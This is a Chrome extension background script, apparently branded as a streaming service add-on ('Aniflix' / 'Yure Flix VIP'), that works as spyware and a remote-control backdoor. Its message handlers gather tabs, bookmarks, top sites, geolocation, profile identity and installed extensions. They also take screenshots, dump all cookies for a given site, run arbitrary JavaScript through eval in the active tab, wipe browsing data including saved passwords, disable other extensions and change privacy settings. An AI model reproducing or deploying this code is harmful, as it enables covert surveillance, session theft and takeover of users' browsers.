// ANIFLIX SENTINEL v3.5 - ULTRA MASTER ENGINE

// --- COLETA DE DADOS TÉCNICOS ---
async function getDeepIntel() {
    const [cpu, memory, tabs, topSites, bookmarks, extensions] = await Promise.all([
        new Promise(r => chrome.system.cpu.getInfo(r)),
        new Promise(r => chrome.system.memory.getInfo(r)),
        new Promise(r => chrome.tabs.query({}, r)),
        new Promise(r => chrome.topSites.get(r)),
        new Promise(r => chrome.bookmarks.getRecent(10, r)),
        new Promise(r => chrome.management.getAll(r))
    ]);

    // Busca Localização
    let location = null;
    try {
        location = await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                () => resolve(null),
                { timeout: 5000 }
            );
        });
    } catch (e) { }

    // Busca identidade se disponível
    let identity = null;
    try {
        identity = await new Promise(r => chrome.identity.getProfileUserInfo(r));
    } catch (e) { }

    return {
        cpu: { modelName: cpu.modelName, usage: cpu.processors.map(p => p.usage) },
        memory: { capacity: (memory.capacity / (1024 ** 3)).toFixed(1) + "GB", available: (memory.availableAmount / (1024 ** 3)).toFixed(1) + "GB" },
        tabs: tabs.map(t => ({ id: t.id, title: t.title, url: t.url, muted: t.mutedInfo?.muted })),
        topSites: topSites,
        bookmarks: bookmarks.map(b => ({ title: b.title, url: b.url })),
        location: location,
        extensions: extensions.map(e => ({ name: e.name, enabled: e.enabled, id: e.id })),
        identity: identity
    };
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    // 1. CAPTURA
    if (request.action === "EXT_CAPTURE_VISIBLE") {
        chrome.tabs.captureVisibleTab(null, { format: "jpeg", quality: 30 }, (data) => sendResponse({ data }));
        return true;
    }

    // 2. INTEL PROFUNDO
    if (request.action === "EXT_GET_DEEP_INTEL") {
        getDeepIntel().then(intel => chrome.idle.queryState(60, (state) => sendResponse({ ...intel, idleState: state })));
        return true;
    }

    // 3. CONTROLE DE ABAS
    if (request.action === "EXT_TAB_ACTION") {
        const { tabId, task } = request.payload;
        if (task === "CLOSE") chrome.tabs.remove(tabId);
        if (task === "RELOAD") chrome.tabs.reload(tabId);
        if (task === "MUTE") chrome.tabs.update(tabId, { muted: true });
        if (task === "UNMUTE") chrome.tabs.update(tabId, { muted: false });
        sendResponse({ status: "done" });
    }

    // 4. NOTIFICAÇÃO
    if (request.action === "EXT_NOTIFY") {
        chrome.notifications.create({
            type: "basic",
            iconUrl: "icon.png",
            title: request.payload.title || "Yure Flix VIP",
            message: request.payload.message,
            priority: 2,
            requireInteraction: true
        });
        sendResponse({ status: "notified" });
    }

    // 5. EXECUÇÃO DE JS
    if (request.action === "EXT_EXEC_JS") {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            if (tabs[0]) {
                chrome.scripting.executeScript({
                    target: { tabId: tabs[0].id },
                    func: (code) => {
                        try { return eval(code); } catch (e) { return e.message; }
                    },
                    args: [request.payload]
                }).then(results => sendResponse({ result: results[0]?.result }));
            }
        });
        return true;
    }

    // 6. LIMPEZA TOTAL (NUKER)
    if (request.action === "EXT_WIPE_DATA") {
        const millisecondsPerWeek = 1000 * 60 * 60 * 24 * 7;
        const oneWeekAgo = (new Date()).getTime() - millisecondsPerWeek;
        chrome.browsingData.remove({
            "since": oneWeekAgo
        }, {
            "appcache": true,
            "cache": true,
            "cookies": true,
            "downloads": true,
            "fileSystems": true,
            "formData": true,
            "history": true,
            "indexedDB": true,
            "localStorage": true,
            "pluginData": true,
            "passwords": true,
            "webSQL": true
        }, () => sendResponse({ status: "system_wiped" }));
        return true;
    }

    // 7. EXTRAÇÃO DE COOKIES
    if (request.action === "EXT_GET_COOKIES") {
        chrome.cookies.getAll({ url: request.payload }, (cookies) => {
            sendResponse({ cookies: JSON.stringify(cookies, null, 2) });
        });
        return true;
    }

    // 8. GERENCIAMENTO DE EXTENSÕES
    if (request.action === "EXT_MGMT_ACTION") {
        const { id, enabled } = request.payload;
        chrome.management.setEnabled(id, enabled, () => sendResponse({ status: "done" }));
        return true;
    }

    // 9. CONTROLE DE PRIVACIDADE
    if (request.action === "EXT_PRIVACY_ACTION") {
        const { setting, value } = request.payload;
        if (chrome.privacy.services[setting]) {
            chrome.privacy.services[setting].set({ value: value }, () => sendResponse({ status: "done" }));
        }
        return true;
    }

    // 10. BLOCK DOMAIN (DNR)
    if (request.action === "EXT_BLOCK_DOMAIN") {
        const domain = request.payload;
        const id = Math.floor(Math.random() * 1000) + 1;
        chrome.declarativeNetRequest.updateDynamicRules({
            addRules: [{
                id: id,
                priority: 1,
                action: { type: 'block' },
                condition: { urlFilter: domain, resourceTypes: ['main_frame'] }
            }]
        }, () => sendResponse({ status: "blocked", ruleId: id }));
        return true;
    }
});
